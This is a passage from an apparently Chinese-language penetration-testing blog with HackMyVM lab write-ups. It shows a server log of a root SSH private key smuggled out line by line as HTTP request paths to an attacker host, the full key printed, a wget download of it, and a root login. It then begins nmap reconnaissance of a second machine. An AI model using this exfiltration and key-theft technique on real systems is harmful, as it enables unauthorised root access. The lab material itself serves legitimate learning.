class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] <span class="string">&quot;GET /3a87DbhP2KPw5sRe0RNSO10xEwcVq0fUfQxFXhlh/VDN7Wr98J7b1RnZ5sCb+Y5lWH9iz2 HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] <span class="string">&quot;GET /m6qvDDDNJZX2HWr6GX+tDhaWLt0MNY5xr64XtxLTipZxE0n2Hueel18jNldckI4aLbAKa/ HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] <span class="string">&quot;GET /a4rL058j5AtMS6lBWFvqxZFLFr8wEECdBlGoWzkjGJkMTBsPLP8yzEnlipUxGgTR/3uSMN HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] <span class="string">&quot;GET /peiKDzLI/Y+QcQku/7GmUIV4ugP0fjMnz/XcXqe6GVNX/gvNeT6WfKPCzcaXiF4I2i228u HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] <span class="string">&quot;GET /TB9Ga5PNU2nYzJAQcAVvDwwC4IiNsDTdQY+cSOJ0KCcs2cq59EaOoZHY6Od88900V3MKFG HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] <span class="string">&quot;GET /TwielzW1Nqq1ltaQYMtnILxzEeXJFp6LlqFTF4Phf/yUyK04a6mhFg3kJzsxE+iDOVH28D HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] <span class="string">&quot;GET /Unj2OgO53KJ2FdLBHkUDlXMaDsISuizi0aj2MnhCryfHefhIsi1JdFyMhVuXCzNGUBAAAA HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] <span class="string">&quot;GET /wQDlr9NWE6q1BovNNobebvw44NdBRQE/1nesegFqlVdtKM61gHYWJotvLV79rjjRfjnGHo HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] <span class="string">&quot;GET /0MoSXZXiC/0/CSfe6Je7unnIzhiA85jSe/u2dIviqItTc2CBRtOZl7Vrflt7lasT7J1WAO HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] <span class="string">&quot;GET /1ROwaN5uL26gIgtf/Y7Rhi0wFPN289UI2gjeVQKhXBObVm3qY7yZh8JpLPH5w0Xeuo20sP HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] <span class="string">&quot;GET /WchZl0D8KSZUKhlPU6Pibqmj9bAAm7hwFecuQMeS+nxg1qIGYAAADBAOZ1XurOyyH9RWIo HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] <span class="string">&quot;GET /0sTQ3d/kJNgTNHAs4Y0SxSOejC+N3tEU33GU3P+ppfHYy595rX7MX4o3gqXFpAaHRIAupr HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] <span class="string">&quot;GET /DbenB1HQW4o6Gg+SF2GWPAQeuDbCsLM9P8XOiQIjTuCvYwHUdFD7nWMJ5Sqr6EeBV+CYw1 HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] <span class="string">&quot;GET /Tg5PIU3FsnN5D3QOHVpGNo2qAvi+4CD0BC5fxOs6cZ1RBqbJ1kanw1H6fF8nRRBds+26Bl HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] <span class="string">&quot;GET //RGZHTBPLVenhNmWN2fje3GDBqVeIbZwAAAMEA2dfdjpefYEgtF0GMC9Sf5UzKIEKQMzoh HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] <span class="string">&quot;GET /oxY6YRERurpcyYuSa/rxIP2uxu1yjIIcO4hpsQaoipTM0T9PS56CrO+FN9mcIcXCj5SVEq HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] <span class="string">&quot;GET /2UVzu9LS0PdqPmniNmWglwvAbkktcEmbmCLYoh5GBxm9VhcL69dhzMdVe73Z9QhNXnMDlf HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] <span class="string">&quot;GET /6xpD9lHWyp+ocD/meYC7V8aio/W9VxL25NlYwdFyCgecd/rIJQ+tGPXoqXIKrf5lVrVtFC HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] <span class="string">&quot;GET /s8IoeeQHSidUKBAAAACnJvb3RAY3JhY2s= HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">35</span>] <span class="string">&quot;GET /-----END HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br></pre></td></tr></table></figure>

<p>这可以拷贝出id_rsa</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEAxBvRe3EH67y9jIt2rwa79tvPDwmb2WmYv8czPn4bgSCpFmhDyHwn</span><br><span class="line">b0IUyyw3iPQ3LlTYyz7qEc2vaj1xqlDgtafvvtJ2EJAJCFy5osyaqbYKgAkGkQMzOevdGt</span><br><span class="line">xNQ8NxRO4/bC1v90lUrhyLi/ML5B4nak+5vLFJi8NlwXMQJ/xCWZg5+WOLduFp4VvHlwAf</span><br><span class="line">tDh2C+tJp2hqusW1jZRqSXspCfKLPt/v7utpDTKtofxFvSS55MFciju4dIaZLZUmiqoD4k</span><br><span class="line">/+FwJbMna8iPwmvK6n/2bOsE1+nyKbkbvDG5pjQ3VBtK23BVnlxU4frFrbicU+VtkClfMu</span><br><span class="line">yp7muWGA1ydvYUruoOiaURYupzuxw25Rao0Sb8nW1qDBYH3BETPCypezQXE22ZYAj0ThSl</span><br><span class="line">Kn2aZN/8xWAB+/t96TcXogtSbQw/eyp9ecmXUpq5i1kBbFyJhAJs7x37WM3/Cb34a/6v8c</span><br><span class="line">9rMjGl9HMZFDwswzAGrvPOeroVB/TpZ+UBNGE1znAAAFgC5UADIuVAAyAAAAB3NzaC1yc2</span><br><span class="line">EAAAGBAMQb0XtxB+u8vYyLdq8Gu/bbzw8Jm9lpmL/HMz5+G4EgqRZoQ8h8J29CFMssN4j0</span><br><span class="line">Ny5U2Ms+6hHNr2o9capQ4LWn777SdhCQCQhcuaLMmqm2CoAJBpEDMznr3RrcTUPDcUTuP2</span><br><span class="line">wtb/dJVK4ci4vzC+QeJ2pPubyxSYvDZcFzECf8QlmYOflji3bhaeFbx5cAH7Q4dgvrSado</span><br><span class="line">arrFtY2Uakl7KQnyiz7f7+7raQ0yraH8Rb0kueTBXIo7uHSGmS2VJoqqA+JP/hcCWzJ2vI</span><br><span class="line">j8Jryup/9mzrBNfp8im5G7wxuaY0N1QbSttwVZ5cVOH6xa24nFPlbZApXzLsqe5rlhgNcn</span><br><span class="line">b2FK7qDomlEWLqc7scNuUWqNEm/J1tagwWB9wREzwsqXs0FxNtmWAI9E4UpSp9mmTf/MVg</span><br><span class="line">Afv7fek3F6ILUm0MP3sqfXnJl1KauYtZAWxciYQCbO8d+1jN/wm9+Gv+r/HPazIxpfRzGR</span><br><span class="line">Q8LMMwBq7zznq6FQf06WflATRhNc5wAAAAMBAAEAAAGAeX9uopbdvGx71wZUqo12iLOYLg</span><br><span class="line">3a87DbhP2KPw5sRe0RNSO10xEwcVq0fUfQxFXhlh/VDN7Wr98J7b1RnZ5sCb+Y5lWH9iz2</span><br><span class="line">m6qvDDDNJZX2HWr6GX+tDhaWLt0MNY5xr64XtxLTipZxE0n2Hueel18jNldckI4aLbAKa/</span><br><span class="line">a4rL058j5AtMS6lBWFvqxZFLFr8wEECdBlGoWzkjGJkMTBsPLP8yzEnlipUxGgTR/3uSMN</span><br><span class="line">peiKDzLI/Y+QcQku/7GmUIV4ugP0fjMnz/XcXqe6GVNX/gvNeT6WfKPCzcaXiF4I2i228u</span><br><span class="line">TB9Ga5PNU2nYzJAQcAVvDwwC4IiNsDTdQY+cSOJ0KCcs2cq59EaOoZHY6Od88900V3MKFG</span><br><span class="line">TwielzW1Nqq1ltaQYMtnILxzEeXJFp6LlqFTF4Phf/yUyK04a6mhFg3kJzsxE+iDOVH28D</span><br><span class="line">Unj2OgO53KJ2FdLBHkUDlXMaDsISuizi0aj2MnhCryfHefhIsi1JdFyMhVuXCzNGUBAAAA</span><br><span class="line">wQDlr9NWE6q1BovNNobebvw44NdBRQE/1nesegFqlVdtKM61gHYWJotvLV79rjjRfjnGHo</span><br><span class="line">0MoSXZXiC/0/CSfe6Je7unnIzhiA85jSe/u2dIviqItTc2CBRtOZl7Vrflt7lasT7J1WAO</span><br><span class="line">1ROwaN5uL26gIgtf/Y7Rhi0wFPN289UI2gjeVQKhXBObVm3qY7yZh8JpLPH5w0Xeuo20sP</span><br><span class="line">WchZl0D8KSZUKhlPU6Pibqmj9bAAm7hwFecuQMeS+nxg1qIGYAAADBAOZ1XurOyyH9RWIo</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">cris@crack:/tmp<span class="variable">$</span> <span class="built_in">wget</span> http://<span class="number">192.168</span>.<span class="number">56.127</span>/ssh.txt                                                                                                                                                                            </span><br><span class="line"><span class="literal">--2023-07-27</span> <span class="number">07</span>:<span class="number">40</span>:<span class="number">45</span><span class="literal">--</span>  http://<span class="number">192.168</span>.<span class="number">56.127</span>/ssh.txt</span><br><span class="line">Conectando con <span class="number">192.168</span>.<span class="number">56.127</span>:<span class="number">80</span>... conectado.</span><br><span class="line">Petición HTTP enviada, esperando respuesta... <span class="number">200</span> OK</span><br><span class="line">Longitud: <span class="number">2629</span> (<span class="number">2</span>,<span class="number">6</span>K) [<span class="type">text</span>/<span class="type">plain</span>]</span><br><span class="line">Grabando a: «ssh.txt.<span class="number">1</span>»</span><br><span class="line">ssh.txt.<span class="number">1</span>                                               <span class="number">100</span>%[==============================================================================================================================&gt;]   <span class="number">2</span>,<span class="number">57</span>K  <span class="literal">--</span>.<span class="literal">-KB</span>/s    en <span class="number">0</span>,<span class="number">002</span>s  </span><br><span class="line"><span class="number">2023</span><span class="literal">-07-27</span> <span class="number">07</span>:<span class="number">40</span>:<span class="number">45</span> (<span class="number">1</span>,<span class="number">49</span> MB/s) - «ssh.txt.<span class="number">1</span>» guardado [<span class="number">2629</span>/<span class="number">2629</span>]</span><br><span class="line">cris@crack:/tmp<span class="variable">$</span> ssh root@<span class="number">127.0</span>.<span class="number">0.1</span> <span class="literal">-i</span> ssh.txt.<span class="number">1</span>                                                             </span><br><span class="line"><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span></span><br><span class="line"><span class="selector-tag">@</span>         WARNING: UNPROTECTED PRIVATE KEY FILE!          <span class="selector-tag">@</span></span><br><span class="line"><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span></span><br><span class="line">Permissions <span class="number">0644</span> <span class="keyword">for</span> <span class="string">&#x27;ssh.txt.1&#x27;</span> are too open.</span><br><span class="line">It is required that your private key files are NOT accessible by others.</span><br><span class="line">This private key will be ignored.</span><br><span class="line">Load key <span class="string">&quot;ssh.txt.1&quot;</span>: bad permissions</span><br><span class="line">root@<span class="number">127.0</span>.<span class="number">0.1</span><span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">cris@crack:/tmp$ chmod 600 ssh.txt.1                                              </span></span><br><span class="line"><span class="string">cris@crack:/tmp$ ssh root@127.0.0.1 -i ssh.txt.1                                   </span></span><br></pre></td></tr></table></figure>

<p>sudo提权成功</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/07/27/crack/" data-id="clmnr8k060007so8gdr7we2nt" data-title="crack" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ftp/" rel="tag">ftp</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hackmyvm/" rel="tag">hackmyvm</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/shellinabox/" rel="tag">shellinabox</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-vulny" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/07/26/vulny/" class="article-date">
  <time class="dt-published" datetime="2023-07-26T00:58:38.000Z" itemprop="datePublished">2023-07-26</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">渗透学习</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/07/26/vulny/">vulny</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="1-扫描网段："><a href="#1-扫描网段：" class="headerlink" title="1.扫描网段："></a>1.扫描网段：</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># nmap -sP 192.168.56.0/24       </span></span><br><span class="line">Starting Nmap <span class="number">7.93</span> ( https://nmap.org ) at <span class="number">2023</span><span class="literal">-07-26</span> <span class="number">09</span>:<span class="number">22</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.1</span></span><br><span class="line">Host is up (<span class="number">0.0011</span>s latency).</span><br><span class="line">MAC Address: <span class="number">0</span>A:<span class="number">00</span>:<span class="number">27</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">0</span>A (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.100</span></span><br><span class="line">Host is up (<span class="number">0.00035</span>s latency).</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:ED:<span class="number">07</span>:<span class="number">63</span> (Oracle VirtualBox virtual NIC)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.132</span></span><br><span class="line">Host is up (<span class="number">0.0021</span>s latency).</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="number">15</span>:<span class="number">51</span>:D4 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.127</span></span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: <span class="number">256</span> IP addresses (<span class="number">4</span> hosts up) scanned <span class="keyword">in</span> <span class="number">7.46</span> seconds</span><br></pre></td></tr></table></figure>

<h2 id="2-扫描端口服务："><a href="#2-扫描端口服务：" class="headerlink" title="2.扫描端口服务："></a>2.扫描端口服务：</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.132</span></span><br><span class="line">Host is up (<span class="number">0.0022</span>s latency).</span><br><span class="line">Not shown: <span class="number">65533</span> closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line"><span class="number">80</span>/tcp    open  http    Apache httpd <span class="number">2.4</span>.<span class="number">41</span> ((Ubuntu))</span><br><span class="line">|_http<span class="literal">-title</span>: Apache2 Ubuntu Default Page: It works</span><br><span class="line">| http<span class="literal">-methods</span>: </span><br><span class="line">|_  Supported Methods: HEAD GET POST OPTIONS</span><br><span class="line">|_http<span class="literal">-server-header</span>: Apache/<span class="number">2.4</span>.<span class="number">41</span> (Ubuntu)</span><br><span class="line"><span class="number">33060</span>/tcp open  mysqlx?</span><br><span class="line">| fingerprint<span class="literal">-strings</span>: </span><br><span class="line">|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: </span><br><span class="line">|     Invalid message<span class="string">&quot;</span></span><br><span class="line"><span class="string">|_    HY000</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<h2 id="3-查看一下网页："><a href="#3-查看一下网页：" class="headerlink" title="3.查看一下网页："></a>3.查看一下网页：</h2><p><img src="/../pic/image-20230726093906134.png" alt="image-20230726093906134"></p>
<p>又是初始界面，扫目录</p>
